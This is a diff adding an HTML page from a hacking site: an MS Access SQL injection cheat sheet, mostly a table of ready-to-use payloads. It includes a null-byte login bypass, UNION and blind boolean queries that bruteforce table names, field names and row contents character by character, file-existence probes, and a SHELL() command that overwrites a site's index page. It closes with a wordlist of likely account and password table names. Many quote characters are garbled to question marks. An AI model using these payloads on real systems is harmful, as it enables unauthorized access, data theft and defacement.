@@ -1,0 +1,569 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<style type="text/css">
+/* <![CDATA[ */
+
+table, td
+{
+    border-color: #353637;
+    border-style: solid;
+}
+
+table
+{
+    border-width: 0 0 2px 2px;
+    border-spacing: 0;
+    border-collapse: collapse;
+}
+
+td
+{
+    margin: 0;
+    padding: 10px;
+    border-width: 2px 2px 0 0;
+}
+
+/* ]]> */
+</style>
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />
+	<head>
+	<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
+	
+	<title>darkc0de.com [ MS Access SQL Injection Cheat Sheet ]</title>
+	<link rel="stylesheet" type="text/css" href="/style.css" />
+	
+	</head>
+
+	<body>
+		<div id="outer">
+			<div id="inner">
+			
+				 <div id="close"><a href="/index.shtml" title="close and return to menu">X</a></div>
+				 <div id="top"><a href="#top" title="back to top">^</a></div> 
+			
+				 <!--greyed out links-->
+				<div class="bgtext">dark  c0de</div>
+				 <div id="text1">scanners</div>
+				 <div id="text2">encryption</div>
+				 <div id="text3">miscellaneous</div>
+				 <div id="text4">bruteforce</div>
+				 <div id="text5">irc-bots</div>
+				 <div id="text6">others</div>
+				<div id="text7">development</div>
+				 <div id="text8">py&raquo;exploits</div>	
+				 <div id="text10">[s3rvices]</div>
+				 <div id="text11">Welcome:</div>
+				 <div id="text13">Affiliates</div>
+				 <div id="text14">[sn1ppets]</div>
+				 <div id="text16">Viewed:</div>
+				 <!--greyed out links end-->
+			
+				 <div id="urltext"><a href="/index.shtml" class="navigurl" title="click to return to the index page">/home &raquo; </a>MS Access SQL Injection Cheat Sheet</div>
+				 	  
+					  <div id="content">
+					  	   <a name="top"></a> 
+
+					  	   <div class="titleblock">Welcome,&nbsp;212.235.66.182</div>
+
+    						   Send all updates to <a href="mailto:d3hydr8[at]gmail[dot]com">[ d3hydr8[at]gmail[dot]com ]</a> or use the form below. 
+						   <div class="titleblock">Last Modified: Tuesday, 22-Sep-2009 10:11:20 EDT</div>
+								<br>
+								<center><form action="/cgi-bin/getinput.py" method='post'>
+									<b>Submit:&nbsp;&nbsp;</b>
+    									<textarea maxlength="30" onkeyup="return ismaxlength(this)" style="background-color:#B0C4DE" name = "message" rows = 1 cols = 40>Enter an update with full details.</textarea><br>
+    									<input type="image" border="0" name="submit" value="send" src="/images/submit.jpg"></form></center><br>
+						   			
+									<ul><li><a href="/database/oracle-cs.shtml">Oracle</a></li>
+									<li><a href="/database/mssql-cs.shtml">MSSQL</a></li>
+									<li><a href="/database/mysql-cs.shtml">MySQL</a></li>
+									<li><a href="/database/postgres-cs.shtml">PostgreSQL</a></li>
+									<li><a href="/database/ingres-cs.shtml">Ingres</a></li>
+									<li><a href="/database/db2-cs.shtml">DB2</a></li>
+									<li><a href="/database/msaccess-cs.shtml">MS Access</a></li></ul>
+									<br><br><center>
+									<table width="530">
+									<tbody><tbody><tr>
+<td>Comments</td>
+<td>There are no comments in MS      Access. So ?/*?, ???, and ?#? can?t be used here. But it?s possible to use      the NULL byte (%00) to comment out the end of the query :
+<ul>
+<li>
+<p>? UNION SELECT 1,1,1 FROM        validTableName%00</p>
+</li>
+</ul>
+</td>
+</tr>
+<tr>
+<td>Syntax Error Message</td>
+<td>?[Microsoft][Driver ODBC Microsoft Access]</td>
+</tr>
+<tr>
+
+<td>Stacked Query</td>
+<td>Not Allowed.</td>
+</tr>
+<tr>
+<td>UNION support</td>
+<td>The UNION operator is      supported, but it needs a valid table name in the FROM clause.</td>
+</tr>
+<tr>
+<td>Subquery</td>
+
+<td>Subqueries are supported      (in the example <em><strong><font color="#ff0000">?TOP 1?</font></strong></em> is used to      make the query returns only one row) :</font>
+<ul>
+<li><strong><font face="Verdana">? AND <font color="#0066ff">(SELECT TOP 1 ?someData? FROM        validTableName)</font>%00</font></strong></li>
+</ul>
+</td>
+</tr>
+<tr>
+<td>LIMIT support</td>
+
+<td height="36" width="100%"><font face="Verdana">LIMIT isn?t implemented,      but it?s possible to use <strong><em><font color="#ff0000">?TOP N?</font></em></strong> in SELECT statement, to limit the number of      returned rows :</font>
+<ul>
+<li><font face="Verdana"><strong>? UNION SELECT <font color="#0066ff">TOP 3</font>        AttrName FROM validTableName%00</strong> : returns (the first) 3 rows</font></li>
+</ul>
+</td>
+</tr>
+<tr>
+
+<td>Make the query returns      0 rows</td>
+<td height="19" width="100%"><font face="Verdana">This could be useful when      the script displays only the first result rows in the html response :</font>
+<ul>
+<li><strong><font face="Verdana">? <font color="#0066ff">AND 1=0</font> UNION        SELECT AttrName1,AttrName2 FROM validTableName%00</font></strong></li>
+</ul>
+</td>
+</tr>
+<tr>
+<td>String concatenation</td>
+
+<td height="19" width="100%"><font face="Verdana">No CONCAT() function exists. It?s      possible to use the ?&amp;? or ?+? operator to concat two strings. But you need to      URL encode them :</font>
+<ul>
+<li dir="ltr">
+<p dir="ltr"><font face="Verdana"><strong>? UNION SELECT <font color="#0066ff">?web? %2b        ?app?</font> FROM validTableName%00  </strong>: returns ?webapp?</font></p>
+</li>
+<li><font face="Verdana"><strong>? UNION SELECT <font color="#0066ff">?web? %26        ?app?</font> FROM validTableName%00  </strong>: returns ?webapp?</font></li>
+
+</ul>
+</td>
+</tr>
+<tr>
+<td>Substring</td>
+<td height="19" width="100%"><font face="Verdana">MID() function :</font>
+<ul>
+<li><font face="Verdana"><strong>? UNION SELECT <font color="#0066ff">MID(?abcd?,1,1)</font>        FROM validTableName%00 </strong>: returns ?a?</font></li>
+<li><font face="Verdana"><strong>? UNION SELECT <font color="#0066ff">MID(?abcd?,2,1)</font>        FROM validTableName%00 </strong>: returns ?b?</font></li>
+
+</ul>
+</td>
+</tr>
+<tr>
+<td>String length</td>
+<td height="19" width="100%"><font face="Verdana">LEN() function :</font>
+<ul>
+<li><font face="Verdana"><strong>? UNION SELECT <font color="#0066ff">LEN(?1234?)</font> FROM validTableName%00        </strong>: returns 4</font></li>
+</ul>
+
+</td>
+</tr>
+<tr>
+<td>Find web root      directory</td>
+<td height="19" width="100%"><font face="Verdana">You can find the web root      directory trying      to select something from an inexistent <a id="KonaLink1" target="_top" class="kLink" style="text-decoration: underline ! important; position: static;" href="#"><font style="color: orange ! important; font-family: Verdana; font-weight: 400; font-size: 12px; position: static;" color="orange"><span class="kLink" style="color: orange ! important; font-family: Verdana; font-weight: 400; font-size: 12px; position: static;">database</span></font></a>. MS Access will response      with an error message containing the full path name :</font>
+<ul>
+<li><strong><font face="Verdana">? UNION SELECT 1 <font color="#0066ff">FROM        ThisIsAFakeName.FakeTable</font>%00</font></strong></li>
+</ul>
+</td>
+
+</tr>
+<tr>
+<td>ASCII value from a      character</td>
+<td height="19" width="100%"><font face="Verdana">ASC() function :</font>
+<ul>
+<li><font face="Verdana"><strong>? UNION SELECT <font color="#0066ff">ASC(?A')</font>        FROM ValidTable%00</strong> : returns 65 (ASCII value for ?A?)</font></li>
+</ul>
+</td>
+
+</tr>
+<tr>
+<td>Character from an      ASCII value</td>
+<td height="19" width="100%"><font face="Verdana">CHR() function :</font>
+<ul>
+<li><font face="Verdana"><strong>? UNION SELECT <font color="#0066ff">CHR(65)</font>        FROM validTableName%00 </strong>: returns ?A?</font></li>
+</ul>
+</td>
+</tr>
+
+<tr>
+<td>IF Statement</td>
+<td height="19" width="100%"><font face="Verdana">IIF() function can be used.      Syntax : IIF(condition, true, false) :</font>
+<ul>
+<li><font face="Verdana"><strong>? UNION SELECT <font color="#0066ff">IIF(1=1, ?a?, ?b?)</font>        FROM validTableName%00</strong> : returns ?a?</font></li>
+</ul>
+</td>
+</tr>
+
+<tr>
+<td>Time Inference</td>
+<td height="19" width="100%"><font face="Verdana">Not allowed. Function such      as      BENCHMARK() or SLEEP() doesn?t exist!</font></td>
+</tr>
+<tr>
+<td>Verify File Existence</td>
+<td height="1" width="100%">
+<p dir="ltr"><font face="Verdana">By injecting :</font></p>
+<ul>
+<li dir="ltr">
+
+<p dir="ltr"><font face="Verdana"><strong>? UNION SELECT name FROM msysobjects       <font color="#0066ff">IN ?\boot.ini?</font>%00 </strong>: (if file exists) an        error message is obtained (it informs that the database format was not recognized).       </font></p>
+</li>
+</ul>
+</td>
+</tr>
+<tr>
+<td>Table Name      bruteforcing</td>
+<td height="1" width="100%"><font face="Verdana">You don?t need the columns name number      to bruteforce the table names. You have to try the table name      wordlist untill you get an error message referred to a wrong number of      columns. In that case you guessed the table name :</font>
+<ul>
+<li><strong><font face="Verdana">? UNION <font color="#0066ff">SELECT 1 FROM table[i]</font>%00</font></strong></li>
+
+</ul>
+</td>
+</tr>
+<tr>
+<td>Field Name      bruteforcing</td>
+<td height="1" width="100%"><font face="Verdana">You need a valid table name and column      number :</font>
+<ul>
+<li><font face="Verdana"><strong>? UNION SELECT <font color="#0066ff">fieldName[1],1,1,1</font> FROM table[i]%00       </strong>: until the error message disappears.</font></li>
+</ul>
+
+</td>
+</tr>
+<tr>
+<td>Login bypass</td>
+<td height="1" width="100%"><font face="Verdana">User :<strong><font color="#0066ff"> ? OR 1=1%00</font></strong>        (or <strong><font color="#0066ff">? OR 1=1%00</font></strong>)</font><font face="Verdana">Password : (blank)</font></td>
+</tr>
+<tr>
+
+<td>Attributes Enumeration</td>
+<td height="18" width="100%"><font face="Verdana"><strong><font color="#0066ff"><em>     NOTE </em></font><em><font color="#0066ff">: This method was tested with JBoss      (using a bugged .jsp script) + MS Access, I don?t know if      this works with other configurations. </font></em></strong></font>
+<p dir="ltr"><font face="Verdana">Usually if a <a id="KonaLink2" target="_top" class="kLink" style="text-decoration: underline ! important; position: static;" href="#"><font style="color: orange ! important; font-family: Verdana; font-weight: 400; font-size: 12px; position: static;" color="orange"><span class="kLink" style="border-bottom: 1px solid orange; color: orange ! important; font-family: Verdana; font-weight: 400; font-size: 12px; position: static; padding-bottom: 1px; background-color: transparent;">SQL </span><span class="kLink" style="border-bottom: 1px solid orange; color: orange ! important; font-family: Verdana; font-weight: 400; font-size: 12px; position: static; padding-bottom: 1px; background-color: transparent;">Injection</span></font></a> exists,      when you type a quote (?) in a URL parameter you obtain an error message such as :</font></p>
+<ul>
+<li><font face="Verdana"><strong><font color="#ff6666"><em>Error (?) syntax        (?) query (?) : ? Id=0? ?</em></font></strong></font></li>
+</ul>
+
+<p><font face="Verdana">And this tells you that the current table has a parameter      called ?Id?. Often <a id="KonaLink3" target="_top" class="kLink" style="text-decoration: underline ! important; position: static;" href="#"><font style="color: orange ! important; font-family: Verdana; font-weight: 400; font-size: 12px; position: static;" color="orange"><span class="kLink" style="border-bottom: 1px solid orange; color: orange ! important; font-family: Verdana; font-weight: 400; font-size: 12px; position: static; padding-bottom: 1px; background-color: transparent;">programmers</span></font></a> use the same names for URL and      query attributes. When you know one parameter name you can use the      technique used with MS SQL <a id="KonaLink4" target="_top" class="kLink" style="text-decoration: underline ! important; position: static;" href="#"><font style="color: orange ! important; font-family: Verdana; font-weight: 400; font-size: 12px; position: static;" color="orange"><span class="kLink" style="color: orange ! important; font-family: Verdana; font-weight: 400; font-size: 12px; position: static;">Server</span></font></a> to enumerate other table fields name by      injecting :</font></p>
+<ul>
+<li><strong><font face="Verdana">? <font color="#0066ff">GROUP BY Id</font>%00</font></strong></li>
+</ul>
+<p><font face="Verdana">Now you?ll obtain a new error message contains      another attribute name. Enumeration follows by injecting :</font></p>
+<ul>
+
+<li><strong><font face="Verdana">? GROUP BY Id,<font color="#0066ff"> SecondAttrName, ?</font>%00</font></strong></li>
+</ul>
+<p><font face="Verdana">until you?ll enumerate all the parameters.</font></p></td>
+</tr>
+<tr>
+<td bgcolor="#353637" colspan="2" align="left" height="1" width="100%">
+<p dir="ltr"><strong><font face="Verdana" size="4">System OS Interaction</font></strong></p>
+</td>
+</tr>
+<tr>
+<td colspan="2" align="left" height="1" width="100%">
+
+<p align="center"><strong><em><font color="#ffffff" face="Times New Roman" size="3">By default its impossible to access to these functions</font></em></strong></p>
+</td>
+</tr>
+<tr>
+<td>Security Notes</td>
+<td height="19" width="100%"><font face="Verdana">It?s possible to block the use of      critical functions (such as SHELL(), etc ?) by setting this register key :</font>
+<ul>
+<li><strong><font color="#0066ff" face="Verdana">\\HKEY_LOCAL_MACHINE\Software\Microsoft\Jet\4.0\engines\SandboxMode</font></strong></li>
+</ul>
+<p><font face="Verdana">Its default values is 2, so by default it?s      impossible to use these functions. What I propose below are some examples tested with that register key setted to 0.</font></p></td>
+
+</tr>
+<tr>
+<td>Get Current Directory</td>
+<td height="19" width="100%"><font face="Verdana">Here you need of columns      number and a valid table name :</font>
+<ul>
+<li><strong><font face="Verdana">? UNION SELECT <font color="#0066ff">CurDir()</font>,1,1 FROM validTableName%00</font></strong></li>
+</ul>
+</td>
+</tr>
+<tr>
+<td>Execute OS Commands</td>
+
+<td height="19" width="100%"><font face="Verdana">SHELL() function can be      used to run OS command :</font>
+<ul>
+<li><strong><font face="Verdana">? AND <font color="#0066ff">SHELL(?cmd.exe /c        echo owned &gt; c:\path\name\index.html?)</font>%00</font></strong></li>
+</ul>
+</td>
+</tr>
+<tr>
+<td bgcolor="#353637" colspan="2" align="left" height="1" width="100%">
+<p dir="ltr"><strong><font face="Verdana" size="4">MS Access System Tables</font></strong></p>
+</td>
+
+</tr>
+<tr>
+<td colspan="2" align="left" height="1" width="100%">
+<p align="center"><strong>     <em>     <font color="#ffffff" face="Times New Roman" size="3">By default it?s      impossible to access to these system tables</font></em></strong></p>
+</td>
+</tr>
+<tr>
+<td>MSysAccessXML</td>
+<td height="1" width="100%"><font face="Verdana">Table fields name :</font>
+<ul>
+<li><font face="Verdana">Id</font></li>
+
+<li><font face="Verdana">LValue</font></li>
+<li><font face="Verdana">ObjectGuid</font></li>
+<li><font face="Verdana">ObjectName</font></li>
+<li><font face="Verdana">Property</font></li>
+<li><font face="Verdana">Value</font></li>
+</ul>
+</td>
+</tr>
+<tr>
+<td>MSysACEs</td>
+
+<td height="1" width="100%"><font face="Verdana">Table fields name :</font>
+<ul>
+<li><font face="Verdana">ACM</font></li>
+<li><font face="Verdana">FInheritable</font></li>
+<li><font face="Verdana">ObjectId</font></li>
+<li><font face="Verdana">SID</font></li>
+</ul>
+</td>
+</tr>
+<tr>
+<td>MSysObjects</td>
+
+<td height="1" width="100%"><font face="Verdana">Here you can find database table name :</font>
+<ul>
+<li><font face="Verdana">Connect</font></li>
+<li><font face="Verdana">Database</font></li>
+<li><font face="Verdana">DataCreate</font></li>
+<li><font face="Verdana">DataUpdate</font></li>
+<li><font face="Verdana">Flags</font></li>
+<li><font face="Verdana">ForeignName</font></li>
+<li><font face="Verdana">Id</font></li>
+
+<li><font face="Verdana">Lv</font></li>
+<li><font face="Verdana">LxExtra</font></li>
+<li><font face="Verdana">LvModule</font></li>
+<li><font face="Verdana">LvProp</font></li>
+<li><font face="Verdana">Name</font></li>
+<li><font face="Verdana">Owner</font></li>
+<li><font face="Verdana">ParentId</font></li>
+<li><font face="Verdana">RmtInfoLong</font></li>
+<li><font face="Verdana">RmtInfoShort</font></li>
+
+<li><font face="Verdana">Type</font></li>
+</ul>
+<p><font face="Verdana">This query can be used to obtain database tables      name :</font></p>
+<ul>
+<li><strong><font face="Verdana">? UNION <font color="#0066ff">SELECT Name FROM        MSysObjects WHERE Type = 1</font>%00</font></strong></li>
+</ul>
+</td>
+</tr>
+<tr>
+<td>Step #1 : Bruteforce Table Name</td>
+<td height="1" width="100%"><font face="Verdana">You have to      bruteforce the table name. You can use the wordlist listed below. Inject query :</font>
+<ul>
+<li><strong><font face="Verdana">? AND <font color="#0066ff">(SELECT TOP 1 1        FROM TableNameToBruteforce[i])</font>%00</font></strong></li>
+</ul>
+<p><font face="Verdana">After injection you have to check the html response page.      If table exists you should have the same <a id="KonaLink6" target="_top" class="kLink" style="text-decoration: underline ! important; position: static;" href="#"><font style="color: orange ! important; font-family: Verdana; font-weight: 400; font-size: 12px; position: static;" color="orange"><span class="kLink" style="color: orange ! important; font-family: Verdana; font-weight: 400; font-size: 12px; position: static;">html </span><span class="kLink" style="color: orange ! important; font-family: Verdana; font-weight: 400; font-size: 12px; position: static;">page</span></font></a> layout (because ?<strong><em><font color="#ff3300">AND      1</font></em></strong>? has no effect on the query).</font></p></td>
+
+</tr>
+<tr>
+<td align="left" height="1" width="205">
+<p dir="ltr"><strong>Step #2 : Bruteforce Field Name</p>
+</td>
+<td height="1" width="100%"><font face="Verdana">You have to      find table fields name.  Inject query :</font>
+<ul>
+<li><strong><font face="Verdana">? AND <font color="#0066ff">(SELECT TOP 1        FieldNameToBruteForce[j] FROM table)</font>%00</font></strong></li>
+</ul>
+<p><font face="Verdana">As above, you should check the html page layout to      inferece the field name existence .</font></p></td>
+
+</tr>
+<tr>
+<td align="left" height="1" width="205">Step #3 : Bruteforce Table rows      number</td>
+<td height="1" width="100%"><font face="Verdana">You have to      find the number of table rows. This value will be used as ?<em><strong><font color="#ff0000">TAB_LEN</font></strong></em>? variable      in the following queries/descriptions :</font>
+<ul>
+<li><strong><font face="Verdana">? AND <font color="#0066ff">IIF((SELECT COUNT(*)        FROM validTableName) = X, 1, 0)</font>%00</font></strong></li>
+</ul>
+<p><font face="Verdana">Where <em><strong><font color="#ff3300">?X?</font></strong></em>      is a number between 0 and an arbitrary value. As above you will find the      correct number by checking html page layout.</font></p></td>
+
+</tr>
+<tr>
+<td align="left" height="1" width="205">Step #4 : Bruteforce item length</td>
+<td height="1" width="100%">
+<p dir="ltr"><font face="Verdana">You can bruteforce the value      length of a generic ?<em>ATTRIB</em>? field at row number 1 with this query :</font></p>
+<ul>
+<li dir="ltr">
+<p dir="ltr"><strong><font face="Verdana">? AND <font color="#0066ff">IIF((SELECT TOP 1 LEN(ATTRIB) FROM        validTableName) = X, 1, 0)</font>%00</font></strong></p>
+</li>
+
+</ul>
+<p dir="ltr"><font face="Verdana">You can bruteforce the value length of a        generic ?<em>ATTRIB</em>? field from row 2 to <em>TAB_LEN</em>        with this query (here N is a number between 2 and        <em>TAB_LEN, </em>the value bruteforced before) :</font></p>
+<ul>
+<li><strong><font face="Verdana">? AND<font color="#0066ff"> IIF((SELECT TOP N        LEN(ATTRIB) FROM validTableName WHERE ATTRIB&lt;&gt;?value1? AND ATTRIB&lt;&gt;?value2?                </font><font color="#111111">?(etc)?</font><font color="#0066ff">) = KKK,1,0)</font>%00</font></strong></li>
+
+</ul>
+<p><font face="Verdana"><em>?</em><strong><em><font color="#ff3300">KKK</font></em></strong><em>?</em><strong><em><font color="#ff3300">     </font> </em></strong>     <font color="#111111">is a value between 0 and an arbitrary value,      while </font><font color="#ff3300"><strong><em>ATTRIB&lt;&gt;?valueXXX?</em></strong></font> is used because we have      to select a specific line to bruteforce. The unique way I found to do this is to select      the desidered row with <em>?<strong><font color="#ff0000">TOP N</font></strong>?</em>,and then insert in the WHERE clause all the      attribute values bruteforced before. I have to say that ?<strong><font color="#ff0000"><em>ATTRIB</em></font></strong>? must      be the table key-field. Here is an example :</font></p>
+
+<p dir="ltr">&nbsp;</p>
+<p align="center">&nbsp;</p>
+<p></p><center>
+<table style="border-collapse: collapse;" id="AutoNumber1" border="1" bordercolor="#111111" cellpadding="0" cellspacing="0" width="49%">
+<tbody><tr>
+<td bgcolor="#cc3399" width="33%"><strong>           <font color="#ffffff" face="Verdana">A1</font></strong></td>
+<td bgcolor="#cc3399" width="33%"><strong>           <font color="#ffffff" face="Verdana">A2</font></strong></td>
+<td bgcolor="#cc3399" width="34%"><strong>           <font color="#ffffff" face="Verdana">A3</font></strong></td>
+</tr>
+<tr>
+<td width="33%"><font face="Verdana">1111</font></td>
+
+<td width="33%"><font face="Verdana">2222</font></td>
+<td width="34%"><font face="Verdana">3333</font></td>
+</tr>
+<tr>
+<td width="33%"><font face="Verdana">0000</font></td>
+<td width="33%"><font face="Verdana">4444</font></td>
+<td width="34%"><font face="Verdana">oooo</font></td>
+</tr>
+<tr>
+<td width="33%"><font face="Verdana">aaaa</font></td>
+<td width="33%"><font face="Verdana">bbbb</font></td>
+
+<td width="34%"><font face="Verdana">cccc</font></td>
+</tr>
+</tbody></table>
+<p></p></center>
+<p dir="ltr" align="left"><font face="Verdana">You can bruteforce fields      value length for row 1 in this way :</font></p>
+<ul>
+<li dir="ltr">
+<p dir="ltr" align="left"><strong><font face="Verdana">? AND</font><font color="#0066ff" face="Verdana">      IIF((SELECT TOP 1 LEN(A1) FROM Table) = KKK, 1, 0)</font><font face="Verdana">%00<br>
+</font></strong>
+</p></li><li dir="ltr">
+<p dir="ltr" align="left"><strong><font face="Verdana">? AND</font><font color="#0066ff" face="Verdana">      IIF((SELECT TOP 1 LEN(A2) FROM Table) = KKK, 1, 0)</font><font face="Verdana">%00<br>
+
+</font></strong>
+</p></li><li dir="ltr">
+<p dir="ltr" align="left"><strong><font face="Verdana">? AND</font><font color="#0066ff" face="Verdana">      IIF((SELECT TOP 1 LEN(A3) FROM Table) = KKK, 1, 0)</font><font face="Verdana">%00</font></strong></p>
+</li>
+</ul>
+<p dir="ltr" align="left"><font face="Verdana">While you can bruteforce fields      length value of second row      in this way (assuming <em>A1</em> as table key-field) :</font></p>
+<ul>
+<li dir="ltr">
+<p dir="ltr" align="left"><strong><font face="Verdana">? AND</font><font color="#0066ff" face="Verdana">      IIF((SELECT TOP 2 LEN(A1) FROM Table WHERE<br>
+
+A1 &lt;&gt;?1111?) = KKK, 1, 0)</font><font face="Verdana">%00<br>
+</font></strong>
+</p></li><li>
+<p align="left"><strong><font face="Verdana">? AND</font><font color="#0066ff" face="Verdana"> IIF((SELECT      TOP 2 LEN(A2) FROM Table WHERE<br>
+A1 &lt;&gt; ?1111?) = KKK, 1, 0)</font><font face="Verdana">%00<br>
+</font></strong>
+</p></li><li dir="ltr">
+
+<p dir="ltr" align="left"><strong><font face="Verdana">? AND</font><font color="#0066ff" face="Verdana">      IIF((SELECT TOP 2 LEN(A3) FROM Table WHERE<br>
+A1 &lt;&gt; ?1111?) = KKK, 1, 0)</font><font face="Verdana">%00</font></strong>
+</p></li></ul>
+<p dir="ltr" align="left"><font face="Verdana">The same for row number 3 :</font></p>
+<ul>
+<li dir="ltr">
+<p dir="ltr" align="left"><strong><font face="Verdana">? AND</font><font color="#0066ff" face="Verdana">      IIF((SELECT TOP 3 LEN(A1) FROM Table WHERE<br>
+
+A1 &lt;&gt;?1111? AND A1 &lt;&gt; ?0000?) = KKK, 1, 0)</font><font face="Verdana">%00<br>
+</font></strong>
+</p></li><li>
+<p align="left"><strong><font face="Verdana">? AND</font><font color="#0066ff" face="Verdana"> IIF((SELECT      TOP 3 LEN(A2) FROM Table WHERE<br>
+A1 &lt;&gt; ?1111? AND A1 &lt;&gt; ?0000?) = KKK, 1, 0)</font><font face="Verdana">%00<br>
+
+</font></strong>
+</p></li><li dir="ltr">
+<p dir="ltr" align="left"><strong><font face="Verdana">? AND</font><font color="#0066ff" face="Verdana">      IIF((SELECT TOP 3 LEN(A3) FROM Table WHERE<br>
+A1 &lt;&gt; ?1111? AND A1 &lt;&gt; ?0000?) = KKK, 1, 0)</font><font face="Verdana">%00</font></strong>
+</p></li></ul>
+<p dir="ltr" align="left"><font face="Verdana">Obviusly, before bruteforcing      field value length (at row between 2 and TAB_LEN) you have to bruteforce the      previous row (key)      field value (you have to put it in the WHERE clause).</font></p>
+</td>
+
+</tr>
+<tr>
+<td align="left" height="1" width="205">Step #5 : Bruteforce Table      Content</td>
+<td height="1" width="100%"><font face="Verdana">Supposing that the attacker      already knows the table and fields name, he will inject this query :</font>
+<ul>
+<li><strong>? AND <font color="#0066ff" face="Verdana">IIF((SELECT TOP N  MID(ATTRIBxxx, XXX, 1) FROM        validTableName WHERE ATT_key &lt;&gt;?value1? AND ATT_key </font>        <font face="Verdana"> <font color="#0066ff">&lt;&gt;?value2?<br>
+</font>? etc ?<font color="#0066ff"> ) = CHAR(YYY), 1, 0)</font>%00</font></strong></li>
+
+</ul>
+<p><font face="Verdana">Where <em><strong><font color="#ff3300">?N?</font></strong></em> is the      row to bruteforce,      <em><strong><font color="#ff3300">?XXX?</font></strong></em> is the      x-th byte of <strong><em><font color="#ff3300">?ATTRIBxxx?</font></em></strong> to      bruteforce, <strong><em><font color="#ff3300">?ATT_key?</font></em></strong> is the      table key-field and <em><strong><font color="#ff3300">?YYY?</font></strong></em> is a number      between 0 and 255 (it </font>     <a href="http://www.google.it/search?hl=it&amp;sa=X&amp;oi=spell&amp;resnum=0&amp;ct=result&amp;cd=1&amp;q=represents&amp;spell=1" class="p" style="text-decoration: none;" onclick="javascript:urchinTracker('/outbound/www.google.it/search?hl=it_amp_sa=X_amp_oi=spell_amp_resnum=0_amp_ct=result_amp_cd=1_amp_q=represents_amp_spell=1');">     <font color="#000000" face="Verdana">represents</font></a><font face="Verdana">      the ASCII value for a char). Here we      have to use the same method mentioned before to correctly bruteforce a specific      row attribute content.</font></p></td>
+
+</tr>
+<tr>
+<td bgcolor="#353637" colspan="2" align="left" height="1" width="100%"><font face="Verdana" size="4">Tables/Fields Bruteforcing (Wordlist)</font></td>
+</tr>
+<tr>
+<td align="left" height="1" width="205">Table/Field Wordlist</td>
+<td height="1" width="100%"><font face="Verdana">Here is a very short table/field      names wordlist that can be used during bruteforcing :</font>
+<ul>
+<li><font size="2">       </font>
+<p align="left"><em><strong><font color="#0066ff" face="Verdana">account, accnts, accnt, user_id, members, usrs,        usr2, accounts, admin, admins, adminlogin, auth, authenticate, authentication,        account, access;</font></strong></em></p>
+</li>
+
+<li>
+<p align="left"><em><strong>       <font color="#0066ff" face="Verdana">customers, customer, config, conf,        cfg;</font></strong></em></p>
+</li>
+<li>
+<p align="left"><em><strong><font color="#0066ff" face="Verdana">hash;</font></strong></em></p>
+</li>
+<li>
+<p align="left"><em><strong><font color="#0066ff" face="Verdana">login, logout, loginout,        log;</font></strong></em></p>
+</li>
+<li>
+<p dir="ltr" align="left"><em><strong><font color="#0066ff" face="Verdana">member, memberid;</font></strong></em></p>
+</li>
+
+<li>
+<p align="left"><em><strong><font color="#0066ff" face="Verdana">password, pass_hash,        pass, passwd, passw, pword, pwrd, pwd;</font></strong></em></p>
+</li>
+<li>
+<p align="left"><em><strong><font color="#0066ff" face="Verdana">store, store1,        store2, store3, store4, setting;</font></strong></em></p>
+</li>
+<li dir="ltr">
+<p dir="ltr" align="left"><em><strong><font color="#0066ff" face="Verdana">username, name, user, user_name, user_username, uname, user_uname, usern, user_usern, un, user_un, usrnm, user_usrnm, usr, usernm, user_usernm, user_nm, user_password, userpass, user_pass, , user_pword, user_passw, user_pwrd, user_pwd,  user_passwd;</font></strong></em></p>
+</li>
+</ul>
+</td>
+</tr>
+</tbody></tbody></table>
+									<br>
+									<br>
+									
+<br><br>
+<a href="http://www.darkc0de.com/store/advertise.html"><font color="white"><b>Advertise Here</b></a></font><br>
+<script language="javascript">
+	zoneIdentifier="3F8D8B7CF6A06513";
+	var varCheckURL = (("https:" == document.location.protocol) ? "https://" : "http://");
+	document.write(unescape("%3Cscript src='" + varCheckURL + "adcode.adengage.com/bootstrap/ae.js' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<br><br>
+
+									<b><font size="2" face="courier">This site is maintained by d3hydr8[at]gmail[dot]com
+									<br>darkc0de.com &trade; &copy; 2006-Now</font></b>
+									<br>
+									<br>
+									</center>
+									<br>
+									
+						  
+						   		</ol>
+								
+						   <div class="titleblock">EOF</div>
+					 
+					 </div>
+			
+			</div>
+		</div>
+		
+	</body>
+
+</html>
